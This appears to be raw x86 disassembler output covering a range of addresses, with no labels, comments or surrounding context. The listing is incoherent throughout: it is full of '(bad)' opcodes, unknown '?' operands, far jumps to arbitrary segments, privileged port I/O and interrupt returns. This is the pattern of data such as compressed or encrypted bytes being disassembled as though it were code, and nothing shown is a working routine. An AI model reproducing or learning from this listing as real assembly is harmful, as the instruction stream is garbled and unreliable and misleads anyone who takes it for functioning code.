  41546f:	jmp    0xbe1:0x385db2b7
  415476:	push   ebp
  415477:	(bad)  
  415478:	cmp    al,0xa6
  41547a:	adc    dh,BYTE PTR [ecx+0x51]
  41547d:	iret   
  41547e:	push   0x829095a5
  415483:	xchg   esi,eax
  415484:	(bad)  
  415486:	out    dx,al
  415487:	fisub  WORD PTR [ebx+edx*4]
  41548a:	mov    al,0xfd
  41548c:	mov    ecx,0x99c3058
  415491:	lods   eax,DWORD PTR ds:[esi]
  415492:	cmp    al,0x69
  415494:	mov    ch,0x25
  415496:	mov    dl,0x10
  415498:	mov    edi,0xac4edb2e
  41549d:	in     eax,0xe9
  41549f:	out    dx,eax
  4154a0:	push   ebx
  4154a1:	dec    esi
  4154a2:	das    
  4154a3:	ds mov bh,ch
  4154a6:	lods   eax,DWORD PTR ds:[esi]
  4154a7:	pop    ss
  4154a8:	mov    esi,0x3b6d6e02
  4154ad:	cdq    
  4154ae:	add    edx,DWORD PTR [edi+0x4212c864]
  4154b4:	or     BYTE PTR [edx],al
  4154b6:	add    al,0x9b
  4154b8:	outs   dx,BYTE PTR ds:[esi]
  4154b9:	(bad)  
  4154ba:	sbb    DWORD PTR [edx+0x76],ebx
  4154bd:	lods   eax,DWORD PTR ds:[esi]
  4154be:	or     BYTE PTR [esi+ebp*4+0x71],bl
  4154c2:	ja     0x415497
  4154c4:	adc    ebx,DWORD PTR [ebp-0x7f]
  4154c7:	add    dh,ah
  4154c9:	lahf   
  4154ca:	ins    DWORD PTR es:[edi],dx
  4154cb:	push   ss
  4154cc:	adc    eax,0xb7217e44
  4154d1:	mov    DWORD PTR [ebp+0x49],0x12785abd
  4154d8:	and    al,BYTE PTR [eax+0x3f]
  4154db:	fcomi  st,st(7)
  4154dd:	or     DWORD PTR [edx],0xffffffc8
  4154e0:	dec    eax
  4154e1:	push   eax
  4154e2:	add    ebp,DWORD PTR ds:0xdcfa5cb3
  4154e8:	cmc    
  4154e9:	mov    al,ds:0x64611f68
  4154ee:	adc    BYTE PTR [edx+0x6],bh
  4154f1:	ficom  DWORD PTR [eax]
  4154f3:	loopne 0x415514
  4154f5:	retf   
  4154f6:	dec    eax
  4154f7:	in     al,0x20
  4154f9:	(bad)  
  4154fa:	lods   eax,DWORD PTR ds:[esi]
  4154fb:	and    BYTE PTR ds:0x81b29e2a,0xce
  415502:	ss cmp al,0x63
  415505:	out    0xaa,eax
  415507:	mov    esp,0x655e6ff8
  41550c:	call   0x42fc:0x2e49ab8e
  415513:	push   0x53
  415515:	and    esi,DWORD PTR ds:0x15c41cc1
  41551b:	or     DWORD PTR [edi+0x31],ebp
  41551e:	lock and DWORD PTR ds:0xe8de0f7,edi
  415526:	pop    edi
  415527:	(bad)  
  415528:	push   ebp
  415529:	sub    ebx,0x12
  41552c:	aad    0xd0
  41552e:	fisttp DWORD PTR [esi+0x393e1833]
  415534:	sbb    al,0xda
  415536:	cld    
  415537:	dec    ebx
  415538:	scas   eax,DWORD PTR es:[edi]
  415539:	mov    al,ds:0x6069fbec
  41553e:	sti    
  41553f:	mov    ecx,0xa44f
	...
  4155b4:	jg     0x415614
  4155b6:	cmc    
  4155b7:	ins    DWORD PTR es:[edi],dx
  4155b8:	cmc    
  4155b9:	out    dx,eax
  4155ba:	call   FWORD PTR [esi-0x5a]
  4155bd:	sub    BYTE PTR [esi+0x31],al
  4155c0:	pop    ecx
  4155c1:	xchg   edx,eax
  4155c2:	xchg   esi,eax
  4155c3:	ret    0xea5a
  4155c6:	add    BYTE PTR [eax],al
  4155c8:	test   BYTE PTR [eax],0x0
  4155cb:	add    BYTE PTR [esi+0xdb31e76],al
  4155d1:	inc    edx
  4155d2:	push   ecx
  4155d3:	fwait
  4155d4:	shr    DWORD PTR [edx],0xb4
  4155d7:	or     DWORD PTR [edi-0x6d],edx
  4155da:	push   cs
  4155db:	mov    bh,0x95
  4155dd:	pop    ecx
  4155de:	out    0x6e,al
  4155e0:	test   BYTE PTR [esi+0x53],0x14
  4155e4:	cwde   
  4155e5:	sub    eax,0xb1e68524
  4155ea:	push   ebp
  4155eb:	cmp    eax,0x2e0ef37a
  4155f0:	lds    ebx,FWORD PTR [esi+esi*1+0xb]
  4155f4:	inc    ecx
  4155f5:	js     0x41563b
  4155f7:	sbb    eax,esp
  4155f9:	scas   al,BYTE PTR es:[edi]
  4155fa:	fiadd  WORD PTR [edi-0x22dd9a4a]
  415600:	mov    bh,0xf6
  415602:	sub    ebp,esi
  415604:	call   0x4e2a:0xf05803ae
  41560b:	pop    edx
  41560c:	das    
  41560d:	enter  0x5003,0xed
  415611:	fadd   QWORD PTR [eax]
  415613:	or     DWORD PTR [ebx],esi
  415615:	sub    ch,BYTE PTR [eax]
  415617:	push   esi
  415618:	mov    dh,0x60
  41561a:	in     al,dx
  41561b:	test   BYTE PTR [esi],al
  41561d:	jmp    0x415618
  41561f:	fs popa 
  415621:	imul   ebx,DWORD PTR [esi],0xdb5f06e3
  415627:	repz test al,0xdd
  41562a:	fistp  WORD PTR [ebp-0x171f02ee]
  415630:	aas    
  415631:	jmp    0x4155c3
  415633:	shr    DWORD PTR [ebp+esi*8+0x4e4d4fe1],1
  41563a:	(bad)  
  41563b:	arpl   dx,dx
  41563d:	sub    eax,0xeb616b87
  415642:	call   FWORD PTR [esi+eiz*1]
  415645:	es xchg esi,eax
  415647:	pop    ecx
  415648:	int    0x7b
  41564a:	not    BYTE PTR [ebx-0x1]
  41564d:	imul   ecx,DWORD PTR [ebx+0x66f453b3],0xa3f04ea2
  415657:	inc    esi
  415658:	cmp    BYTE PTR ss:[ecx+0x11e64afb],0x40
  415660:	jo     0x415611
  415662:	in     al,dx
  415663:	mov    ebx,0xc88b4f6
  415668:	das    
  415669:	out    0x3a,al
  41566b:	outs   dx,DWORD PTR ds:[esi]
  41566c:	js     0x4155f6
  41566e:	pop    es
  41566f:	outs   dx,DWORD PTR ds:[esi]
  415670:	adc    ch,BYTE PTR [ebx-0x30be4794]
  415676:	pop    ss
  415677:	pop    edx
  415678:	popf   
  415679:	cli    
  41567a:	jmp    0x5ce8253b
  41567f:	mov    esi,0xf8d500fb
  415684:	ins    DWORD PTR es:[edi],dx
  415685:	cmovns esp,DWORD PTR [ebx]
  415688:	jmp    0xe764:0x791e36ad
  41568f:	clc    
  415690:	jg     0x41564a
  415692:	cld    
  415693:	bound  esi,QWORD PTR gs:[esi+0x7c01fc80]
  41569a:	add    al,0x1a
  41569c:	mov    ds:0xc841bc99,eax
  4156a1:	xor    BYTE PTR [edi+ecx*4-0x7969ff6c],ch
  4156a8:	dec    esi
  4156a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156aa:	mov    BYTE PTR [ebp+0x78],ch
  4156ad:	mov    ebx,0xfe7b82d7
  4156b2:	ret    0x8bbd
  4156b5:	in     al,dx
  4156b6:	aas    
  4156b7:	and    eax,0xb8f2d966
  4156bc:	push   esp
  4156bd:	ret    
  4156be:	pushf  
  4156bf:	pusha  
  4156c0:	mov    ebp,0x1e
	...
  415731:	add    BYTE PTR [eax],al
  415733:	add    BYTE PTR [esi+0x2f],bh
  415736:	add    DWORD PTR [ebp+0x51],ebp
  415739:	outs   dx,DWORD PTR ds:[esi]
  41573a:	jle    0x41577b
  41573c:	dec    esp
  41573d:	xchg   esp,eax
  41573e:	call   0xb41284d3
  415743:	xlat   BYTE PTR ds:[ebx]
  415744:	push   eax
  415745:	jmp    0x415747
  415747:	add    dh,dh
  415749:	add    BYTE PTR [eax],al
  41574b:	add    BYTE PTR [eax],dh
  41574d:	mov    esp,0x6bf5b0b9
  415752:	jmp    0xea37:0x4a5e78cf
  415759:	std    
  41575a:	imul   bh
  41575c:	push   ss
  41575d:	jp     0x415722
  41575f:	dec    esp
  415760:	xor    bh,cl
  415762:	mov    dl,0x18
  415764:	mov    ebx,0x18a46a61
  415769:	dec    eax
  41576a:	dec    ebp
  41576b:	dec    edx
  41576c:	push   ecx
  41576d:	popa   
  41576e:	popa   
  41576f:	jno    0x415737
  415771:	cmc    
  415772:	or     ah,bh
  415774:	jmp    0xa916:0x32dc581e
  41577b:	retf   0x66e4
  41577e:	mov    fs,esi
  415780:	jbe    0x41572d
  415782:	cmp    dh,bl
  415784:	lahf   
  415785:	sbb    edi,ebp
  415787:	adc    eax,0x7d0ff4fb
  41578c:	call   0x9c3f:0xc83a032c
  415793:	(bad)  
  415794:	pop    ss
  415795:	cmp    al,BYTE PTR [esp+ecx*1-0x4e]
  415799:	or     DWORD PTR [esi+0x2f],edi
  41579c:	ret    
  41579d:	ds adc al,0xba
  4157a0:	fistp  QWORD PTR [esp+eiz*8]
  4157a3:	mov    ds:0xffbc2e76,eax
  4157a8:	mov    ds:0x14a95f18,eax
  4157ad:	cmp    esp,DWORD PTR [ecx+ebx*1]
  4157b0:	jg     0x415812
  4157b2:	sbb    ch,0x68
  4157b5:	in     eax,0x17
  4157b7:	sahf   
  4157b8:	dec    esi
  4157b9:	ja     0x41580e
  4157bb:	cmp    esi,DWORD PTR [edx-0x42c381b1]
  4157c1:	jns    0x4157f9
  4157c3:	dec    edx
  4157c4:	xchg   esi,eax
  4157c5:	int    0x5e
  4157c7:	mov    dl,0x9d
  4157c9:	repnz repz xor dl,cl
  4157cd:	xor    BYTE PTR [ebx],0xcc
  4157d0:	daa    
  4157d1:	mov    al,ds:0x3be0ecde
  4157d6:	aaa    
  4157d7:	cmp    eax,DWORD PTR [edx]
  4157d9:	data16 sub BYTE PTR [esi],al
  4157dc:	pop    ds
  4157dd:	jl     0x72f63f93
  4157e3:	dec    esp
  4157e4:	(bad)  
  4157e5:	rcr    DWORD PTR [eax-0x69d4651f],cl
  4157eb:	mov    ecx,DWORD PTR [ebx+0x4cda938b]
  4157f1:	ja     0x415842
  4157f3:	popa   
  4157f4:	dec    edx
  4157f5:	inc    ebp
  4157f6:	outs   dx,BYTE PTR ds:[esi]
  4157f7:	xchg   edx,eax
  4157f8:	cmc    
  4157f9:	pop    edi
  4157fa:	ds in  al,0x13
  4157fd:	push   edx
  4157fe:	stos   DWORD PTR es:[edi],eax
  4157ff:	pop    edx
  415800:	and    BYTE PTR [esi-0x405e0f61],dh
  415806:	fsubr  DWORD PTR [edi-0x6b70ded8]
  41580c:	pop    ss
  41580d:	push   edi
  41580e:	dec    ebp
  41580f:	push   edx
  415810:	(bad)  
  415811:	retf   
  415812:	cmp    BYTE PTR [ebx+ebx*2],bl
  415815:	cmp    ebp,DWORD PTR ds:0x5e15a467
  41581b:	leave  
  41581c:	outs   dx,DWORD PTR es:[esi]
  41581e:	xor    al,0x99
  415820:	mov    ?,WORD PTR [ebx+0xe03ac55]
  415826:	mov    ebx,0x8781ce44
  41582b:	mov    WORD PTR [edx+ebp*4],ss
  41582e:	and    bh,ah
  415830:	mov    ch,0xac
  415832:	inc    ebx
  415833:	sbb    BYTE PTR [esi+0x73],0x36
  415837:	cs and al,0xf
  41583a:	bound  ecx,QWORD PTR [eax+0x45f6c1ad]
  415840:	add    eax,0x47
	...
  4158b1:	add    BYTE PTR [eax],al
  4158b3:	add    BYTE PTR [ebx],cl
  4158b5:	jle    0x415889
  4158b7:	and    esi,edi
  4158b9:	scas   eax,DWORD PTR es:[edi]
  4158ba:	sti    
  4158bb:	jle    0x41583e
  4158bd:	inc    eax
  4158be:	sbb    eax,0xa38ccdfe
  4158c3:	add    al,BYTE PTR [esi-0x14]
  4158c6:	add    BYTE PTR [eax],al
  4158c8:	test   BYTE PTR [eax],0x0
  4158cb:	add    BYTE PTR [edx+0x26cb8436],dl
  4158d1:	or     ecx,DWORD PTR [edi+0x55]
  4158d4:	cwde   
  4158d5:	test   eax,0xc76d570f
  4158da:	fnsave [ebp-0x188fa66d]
  4158e0:	xor    DWORD PTR [edi+0x54e00caa],ebp
  4158e6:	jne    0x4158e7
  4158e8:	scas   al,BYTE PTR es:[edi]
  4158e9:	mov    esi,0x9fba954d
  4158ee:	jnp    0x4158e0
  4158f0:	fld    QWORD PTR [esi+0x3e84f782]
  4158f6:	dec    edx
  4158f7:	jns    0x41592d
  4158f9:	xor    BYTE PTR [edi-0x59],cl
  4158fc:	adc    DWORD PTR [ebp+0x6],0x7d369786
  415903:	mov    ebp,DWORD PTR [esi+ecx*2+0x68]
  415907:	ja     0x4158bc
  415909:	sub    BYTE PTR [ebx+0x510bb4b1],0x5e
  415910:	cwde   
  415911:	(bad)  
  415913:	mov    ecx,0xa0a736a0
  415918:	popf   
  415919:	mov    al,0x82
  41591b:	xchg   edi,eax
  41591c:	inc    ecx
  41591d:	fild   WORD PTR [eax+0x1c614d68]
  415923:	push   0x11959dbc
  415928:	mov    ebx,?
  41592a:	test   al,cl
  41592c:	in     eax,0xea
  41592e:	dec    eax
  41592f:	(bad)  
  415930:	sbb    eax,0x65d5c2ce
  415935:	fnstenv [ebx]
  415937:	or     al,0x86
  415939:	inc    ebp
  41593a:	sub    BYTE PTR [edi+0x1d4e733f],bl
  415940:	jo     0x4158fb
  415942:	and    bh,bl
  415944:	popf   
  415945:	fs dec edx
  415947:	fs ins BYTE PTR es:[edi],dx
  415949:	mov    al,ds:0x5e254795
  41594e:	jmp    0x41592d
  415950:	(bad)  
  415951:	hlt    
  415952:	pop    ecx
  415953:	fs sbb eax,0x8bcc359a
  415959:	retf   
  41595a:	iret   
  41595b:	(bad)  
  41595c:	neg    BYTE PTR [ebx+edi*1]
  41595f:	fs xchg ebx,eax
  415961:	jge    0x41598a
  415963:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415964:	pop    DWORD PTR [ebx+0x2f]
  415967:	cmp    al,bl
  415969:	dec    ebx
  41596a:	adc    al,BYTE PTR [edx-0x47]
  41596d:	pop    ebx
  41596e:	nop
  41596f:	(bad)  [ebx+ebp*2-0x6d]
  415973:	mov    dh,0x80
  415975:	adc    DWORD PTR [edi],ebx
  415977:	mov    esp,0xc7ea6ede
  41597c:	fwait
  41597d:	push   ebx
  41597e:	mov    ah,0x79
  415981:	mov    bl,cl
  415983:	mov    gs,WORD PTR [eax]
  415985:	push   0x9f9dfe5c
  41598a:	mov    al,ds:0xe18586f3
  41598f:	mov    ds:0xc0fad7b0,al
  415994:	jno    0x4159e1
  415996:	cdq    
  415997:	xor    ebx,DWORD PTR [esi]
  415999:	cdq    
  41599a:	(bad)  
  41599b:	fstp   DWORD PTR [ebx]
  41599d:	dec    ecx
  41599e:	cli    
  41599f:	scas   eax,DWORD PTR es:[edi]
  4159a0:	add    cl,BYTE PTR [edi+0x4c]
  4159a3:	(bad)  
  4159a4:	call   0xe59c:0x87525aa2
  4159ab:	fcmove st,st(4)
  4159ad:	mov    ebp,0xcd69c4b3
  4159b2:	cld    
  4159b3:	and    al,0x8c
  4159b5:	cs xchg edi,eax
  4159b7:	call   0x1917:0x2a4cecf0
  4159be:	push   ss
  4159bf:	xor    edi,DWORD PTR [eax+0x45]
	...
  415a32:	add    BYTE PTR [eax],al
  415a34:	lahf   
  415a35:	fnstcw WORD PTR [esi]
  415a37:	ss jle 0x415a31
  415a3a:	lahf   
  415a3b:	stc    
  415a3c:	inc    ecx
  415a3d:	jb     0x415a8e
  415a3f:	lahf   
  415a40:	lock scas eax,DWORD PTR es:[edi]
  415a42:	test   eax,0xed3c19
  415a47:	add    dh,dh
  415a49:	add    BYTE PTR [eax],al
  415a4b:	add    BYTE PTR [ebx-0x453ae14f],bh
  415a51:	jno    0x415a2d
  415a53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a54:	mov    edx,0x36d370c8
  415a59:	sub    bl,BYTE PTR [edi]
  415a5b:	jmp    0x5767e229
  415a60:	add    bh,bh
  415a62:	mov    ebx,0x1716c3e1
  415a67:	jp     0x415aa5
  415a69:	sub    ecx,DWORD PTR [esi]
  415a6b:	pop    eax
  415a6c:	mov    ebx,0x5b03815
  415a71:	test   eax,0x71553e62
  415a76:	inc    BYTE PTR [edx+0x15b73e9e]
  415a7c:	jo     0x415a42
  415a7e:	or     BYTE PTR [edi+0x58],dh
  415a81:	cld    
  415a82:	xchg   esi,esp
  415a84:	cwde   
  415a85:	cld    
  415a86:	retf   
  415a87:	mov    edi,0x42f7f872
  415a8c:	out    0xed,al
  415a8e:	mov    BYTE PTR [edx],al
  415a90:	add    BYTE PTR [edx-0x2f347e1f],cl
  415a96:	test   DWORD PTR [edx],0xbcb3566e
  415a9c:	cmp    eax,0xdd385a8b
  415aa1:	clc    
  415aa2:	xor    eax,0xe113aa81
  415aa7:	push   ds
  415aa8:	push   esp
  415aa9:	and    DWORD PTR [ebx-0x2a],ebx
  415aac:	out    0xdb,eax
  415aae:	adc    DWORD PTR [edx+0xdc00822],0xbfe2e9ce
  415ab8:	call   DWORD PTR ds:0x89064cc9
  415abe:	scas   al,BYTE PTR es:[edi]
  415abf:	pop    edi
  415ac0:	add    DWORD PTR [esi-0x1a],eax
  415ac3:	cs pusha 
  415ac5:	mov    BYTE PTR [ebx+0x24],dh
  415ac8:	aam    0x79
  415aca:	mov    al,0xae
  415acc:	push   ecx
  415acd:	mov    dh,0xd8
  415acf:	jp     0x415acb
  415ad1:	or     BYTE PTR [edi+0x2581c206],dh
  415ad7:	xchg   ebx,eax
  415ad8:	push   ebx
  415ad9:	sbb    esi,esp
  415adb:	ins    BYTE PTR es:[edi],dx
  415adc:	jno    0x415a9a
  415ade:	loope  0x415adf
  415ae0:	test   al,0x4
  415ae2:	ins    BYTE PTR es:[edi],dx
  415ae3:	cmc    
  415ae4:	pop    esp
  415ae5:	jmp    0xe71f60b4
  415aea:	push   esi
  415aeb:	shr    BYTE PTR [edx-0x798f1f4],0x7c
  415af2:	inc    ebx
  415af3:	sub    eax,0xe992f059
  415af8:	cli    
  415af9:	lea    esp,[ecx]
  415afb:	call   0xf2a1620b
  415b00:	repnz mov al,0x10
  415b03:	sub    ah,BYTE PTR [ebx]
  415b05:	mov    esi,DWORD PTR [ebx]
  415b07:	and    dh,0xac
  415b0a:	cdq    
  415b0b:	fisub  WORD PTR [ebx+0x36c03517]
  415b11:	xchg   edi,eax
  415b12:	adc    al,0xb5
  415b14:	mov    ecx,?
  415b16:	test   al,0x42
  415b18:	jp     0x415aa8
  415b1a:	rcl    cl,0xd
  415b1d:	out    dx,al
  415b1e:	push   cs
  415b1f:	cmp    eax,0x26e4b3ee
  415b24:	cmp    al,BYTE PTR [esi-0x7549ee80]
  415b2a:	cmc    
  415b2b:	pop    esp
  415b2c:	inc    edx
  415b2d:	hlt    
  415b2e:	popa   
  415b2f:	or     eax,0x665fc3ea
  415b34:	push   edx
  415b35:	push   eax
  415b36:	cdq    
  415b37:	(bad)  
  415b38:	ficomp WORD PTR [eax]
  415b3a:	adc    bl,BYTE PTR [ecx]
  415b3c:	lock inc ebx
  415b3e:	cdq    
  415b3f:	xchg   ebx,eax
  415b40:	fiadd  DWORD PTR [ebp+0x0]
	...
  415bb3:	add    BYTE PTR [esp+eiz*2],dh
  415bb6:	push   ds
  415bb7:	jl     0x415c17
  415bb9:	jle    0x415c31
  415bbb:	ins    BYTE PTR es:[edi],dx
  415bbc:	pop    ds
  415bbd:	dec    DWORD PTR [edi+0x5a]
  415bc0:	sub    bl,cl
  415bc2:	stc    
  415bc3:	icebp  
  415bc4:	xor    ch,dh
  415bc6:	add    BYTE PTR [eax],al
  415bc8:	test   BYTE PTR [eax],0x0
  415bcb:	add    ch,dl
  415bcd:	pop    eax
  415bce:	arpl   WORD PTR [eax],cx
  415bd0:	xchg   esi,eax
  415bd1:	jge    0x415c37
  415bd3:	cmp    BYTE PTR [ebp+0x7a],dl
  415bd6:	jp     0x415be8
  415bd8:	dec    edi
  415bd9:	arpl   WORD PTR [eax-0x1c],sp
  415bdc:	fsubr  QWORD PTR [edx+eiz*4]
  415bdf:	dec    eax
  415be0:	ja     0x415bed
  415be2:	jg     0x415c36
  415be4:	jbe    0x415c28
  415be6:	or     ah,ah
  415be8:	mov    ds:0x2d6a3882,eax
  415bed:	sbb    DWORD PTR [ebx-0x6],edx
  415bf0:	mov    bh,0x38
  415bf2:	(bad)  
  415bf3:	lods   al,BYTE PTR ds:[esi]
  415bf4:	test   DWORD PTR [edi],ecx
  415bf6:	push   es
  415bf7:	(bad)  
  415bf8:	pushf  
  415bf9:	ret    0xbdb9
  415bfc:	mov    dh,0x17
  415bfe:	iret   
  415bff:	xchg   esp,eax
  415c00:	cmc    
  415c01:	cs popf 
  415c03:	push   esp
  415c04:	scas   eax,DWORD PTR es:[edi]
  415c05:	mov    al,ds:0x3af2b781
  415c0a:	jl     0x415be7
  415c0c:	mov    al,dl
  415c0e:	out    0x9a,al
  415c10:	jns    0x415c7d
  415c12:	jb     0x415bf6
  415c14:	xchg   esi,eax
  415c15:	inc    esi
  415c16:	dec    edi
  415c17:	sbb    BYTE PTR [ecx],al
  415c19:	sti    
  415c1a:	loop   0x415c5a
  415c1c:	shl    DWORD PTR [eax+0x462e3684],0x37
  415c23:	popa   
  415c24:	cmp    al,0xb9
  415c26:	sti    
  415c27:	dec    ebp
  415c28:	aad    0x3c
  415c2a:	sub    ecx,DWORD PTR [eax-0x25]
  415c2d:	lods   eax,DWORD PTR ds:[esi]
  415c2e:	push   esi
  415c2f:	jmp    0xfbd96f5a
  415c34:	(bad)  
  415c35:	cmp    al,0xb6
  415c37:	mov    ebx,0x17302fdf
  415c3c:	and    edx,edi
  415c3e:	dec    ecx
  415c3f:	push   eax
  415c40:	data16 sbb bl,BYTE PTR [edi]
  415c43:	mov    eax,ds:0xeb466be3
  415c48:	lahf   
  415c49:	(bad)  
  415c4a:	cli    
  415c4b:	dec    edx
  415c4c:	inc    esp
  415c4d:	fcmovnu st,st(1)
  415c4f:	pop    ebx
  415c50:	xor    DWORD PTR ds:[eax-0x55],esp
  415c54:	out    0x65,eax
  415c56:	sub    bh,BYTE PTR [eax+0x72]
  415c59:	sahf   
  415c5a:	push   eax
  415c5b:	pusha  
  415c5c:	mov    ch,0x2d
  415c5e:	sub    dl,bl
  415c60:	mov    edx,0xceaee842
  415c65:	jo     0x415c4c
  415c67:	lock or eax,0x2b901b0
  415c6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c6e:	das    
  415c6f:	pop    edi
  415c70:	(bad)  
  415c72:	xchg   edi,eax
  415c73:	jecxz  0x415cd2
  415c75:	inc    edx
  415c76:	(bad)  
  415c77:	jno    0x415cdb
  415c79:	cdq    
  415c7a:	loop   0x415cad
  415c7c:	sub    al,0x65
  415c7e:	lods   eax,DWORD PTR ds:[esi]
  415c7f:	adc    esi,ebp
  415c81:	ds jo  0x415c8c
  415c84:	std    
  415c85:	arpl   WORD PTR ds:0xab168af6,si
  415c8b:	jecxz  0x415cfd
  415c8d:	ja     0x415cae
  415c8f:	push   0xd945b8a4
  415c94:	cwd    
  415c96:	jnp    0x415ce0
  415c98:	hlt    
  415c99:	sbb    DWORD PTR ds:0x447ce115,ecx
  415c9f:	cmp    BYTE PTR [esi],ch
  415ca1:	les    ecx,FWORD PTR cs:[edi-0x1f39ee6d]
  415ca8:	pop    ds
  415ca9:	cmp    ebp,DWORD PTR [esi]
  415cab:	test   DWORD PTR [ebx-0x2],ebp
  415cae:	jns    0x415c48
  415cb0:	addr16 (bad) 
  415cb2:	sub    dh,BYTE PTR [edi]
  415cb4:	cli    
  415cb5:	push   esp
  415cb6:	mov    ah,0x3b
  415cb8:	mov    esp,0x4030f5ba
  415cbd:	jge    0x415c86
  415cbf:	jae    0x415d37
  415cc1:	mov    eax,DWORD PTR [eax]
	...
  415d33:	add    BYTE PTR [edi+0x3e911299],dh
  415d39:	fwait
  415d3a:	mov    bh,0xbf
  415d3c:	pop    ebp
  415d3d:	jmp    0xf910:0xf445e72f
  415d44:	sub    bh,ch
  415d46:	add    BYTE PTR [eax],al
  415d48:	test   BYTE PTR [eax],0x0
  415d4b:	add    BYTE PTR [ebp-0x51],ch
  415d4e:	mov    ds:0xe48863b3,al
  415d53:	sti    
  415d54:	cmp    al,0x26
  415d56:	ds inc ebp
  415d58:	aaa    
  415d59:	pop    esi
  415d5a:	xor    al,0xa7
  415d5c:	lods   al,BYTE PTR ds:[esi]
  415d5d:	sar    DWORD PTR [ecx+0xe],cl
  415d60:	xchg   ebx,eax
  415d61:	dec    ebp
  415d62:	and    eax,0xc4276dab
  415d67:	bnd jge 0x415d5a
  415d6a:	sti    
  415d6b:	retf   0x2aa2
  415d6e:	jg     0x415d62
  415d70:	sbb    al,0x2e
  415d72:	retf   0xf47
  415d75:	aaa    
  415d76:	into   
  415d77:	sar    BYTE PTR [edx+eiz*1+0x1174c66],1
  415d7e:	jle    0x415d9f
  415d80:	mov    al,ds:0x4976b378
  415d85:	addr16 sbb eax,0x1e4b9595
  415d8b:	mov    dh,0xb
  415d8d:	jb     0x415dc3
  415d8f:	add    al,0xed
  415d91:	lea    ebp,[ebx-0x7118b59e]
  415d97:	sub    eax,DWORD PTR [esi-0x3ff45c39]
  415d9d:	pop    esp
  415d9e:	jle    0x415dcb
  415da0:	out    dx,eax
  415da1:	add    al,0x2f
  415da3:	sub    eax,esp
  415da5:	stos   BYTE PTR es:[edi],al
  415da6:	or     DWORD PTR [edx],ebp
  415da8:	repnz and ah,BYTE PTR [ebp+eax*1-0x43]
  415dad:	mov    ds:0xbff958c2,al
  415db2:	xchg   esp,eax
  415db3:	lods   al,BYTE PTR ds:[esi]
  415db4:	xor    al,0x56
  415db6:	inc    esi
  415db7:	pminub mm5,mm5
  415dba:	ficom  WORD PTR [ebx+esi*2+0x69]
  415dbe:	cmp    esi,DWORD PTR [edx]
  415dc0:	mov    DWORD PTR [ecx],edi
  415dc2:	test   al,0xb7
  415dc4:	jo     0x415e0a
  415dc6:	xchg   edx,eax
  415dc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415dc8:	loopne 0x415e0f
  415dca:	sar    BYTE PTR [ebx],cl
  415dcc:	popa   
  415dcd:	jbe    0x415dcb
  415dcf:	inc    ebp
  415dd0:	fcomp  DWORD PTR [eax-0x5b]
  415dd3:	sbb    ecx,DWORD PTR [edi-0x154a5a72]
  415dd9:	inc    eax
  415dda:	mov    edx,es
  415ddc:	ror    DWORD PTR [ebx],1
  415dde:	or     ebx,eax
  415de0:	mov    ecx,0x6f9092fa
  415de5:	or     al,0xd9
  415de7:	pop    ss
  415de8:	(bad)  
  415de9:	xor    ah,cl
  415deb:	push   cs
  415dec:	sub    ch,BYTE PTR [ecx+ebx*1+0x440be89c]
  415df3:	sti    
  415df4:	hlt    
  415df5:	xor    eax,0xbfe1e202
  415dfa:	(bad)  
  415dfb:	and    DWORD PTR [ecx],edx
  415dfd:	mov    al,ds:0xe8c30f50
  415e02:	jno    0x415ded
  415e04:	jecxz  0x415e6c
  415e06:	loop   0x415e3c
  415e08:	inc    ecx
  415e09:	adc    ch,BYTE PTR [edx-0x28]
  415e0c:	xor    cl,BYTE PTR [edi-0x52d182ef]
  415e12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e13:	mov    eax,0x2b932a77
  415e18:	jge    0x415e2a
  415e1a:	stos   DWORD PTR es:[edi],eax
  415e1b:	fisub  WORD PTR [esi]
  415e1d:	mov    dh,0x35
  415e1f:	aam    0xfa
  415e21:	ror    BYTE PTR [ebp+0x3429efee],1
  415e27:	cs push cs
  415e29:	cmp    ch,bh
  415e2b:	sbb    ecx,DWORD PTR ds:0x43cdec8d
  415e31:	mov    ecx,ss
  415e33:	push   esp
  415e34:	idiv   DWORD PTR [ebx-0x2fb4cc1a]
  415e3a:	jp     0x415eb9
  415e3c:	mov    ds:0x97efb5ae,eax
  415e41:	rol    DWORD PTR [eax],0x0
	...
  415eb4:	aaa    
  415eb5:	data16 xor al,0x9b
  415eb8:	jne    0x415e95
  415eba:	mov    edi,0xdeb84bee
  415ebf:	gs aaa 
  415ec1:	mov    ah,0x49
  415ec3:	out    0x1e,eax
  415ec5:	lock add BYTE PTR [eax],al
  415ec8:	test   BYTE PTR [eax],0x0
  415ecb:	add    BYTE PTR [edx],dl
  415ecd:	add    BYTE PTR [ebx+edi*2],0xad
  415ed1:	mov    ecx,0xbe1564d6
  415ed6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ed7:	mov    al,0x6
  415ed9:	xor    ebx,DWORD PTR [ebx+0x57]
  415edc:	ins    BYTE PTR es:[edi],dx
  415edd:	cmp    DWORD PTR [eax+eiz*1],esp
  415ee0:	mov    edx,0xf001877a
  415ee5:	outs   dx,DWORD PTR ds:[esi]
  415ee6:	or     ah,dh
  415ee8:	mov    eax,0x1121c0df
  415eed:	div    DWORD PTR [edx]
  415eef:	pop    es
  415ef0:	or     eax,0x100d6b0c
  415ef5:	and    BYTE PTR [ebx-0x3b642ed3],dl
  415efb:	jecxz  0x415ed3
  415efd:	pop    ebx
  415efe:	push   cs
  415eff:	out    0xf4,eax
  415f01:	stc    
  415f02:	clc    
  415f03:	mov    eax,0x751f410e
  415f08:	(bad)  
  415f09:	mov    bl,0x0
  415f0b:	aad    0x38
  415f0d:	dec    BYTE PTR [esi+edi*1+0x6e]
  415f11:	pop    ss
  415f12:	call   0x3d1937a0
  415f17:	hlt    
  415f18:	stc    
  415f19:	jnp    0x415f93
  415f1b:	imul   eax,DWORD PTR [edx],0xffffffff
  415f1e:	and    DWORD PTR [esi+edx*2],edx
  415f21:	or     DWORD PTR [esi+0x1a],esp
  415f24:	sbb    eax,0xdf515074
  415f29:	jne    0x415f8e
  415f2b:	cwde   
  415f2c:	jnp    0x415f44
  415f2e:	jb     0x415fad
  415f30:	(bad)  
  415f31:	jne    0x415ed5
  415f33:	xor    al,0xe
  415f35:	mov    ds:0x3243a4ef,eax
  415f3a:	mov    al,ds:0x8b7b8f59
  415f3f:	push   cs
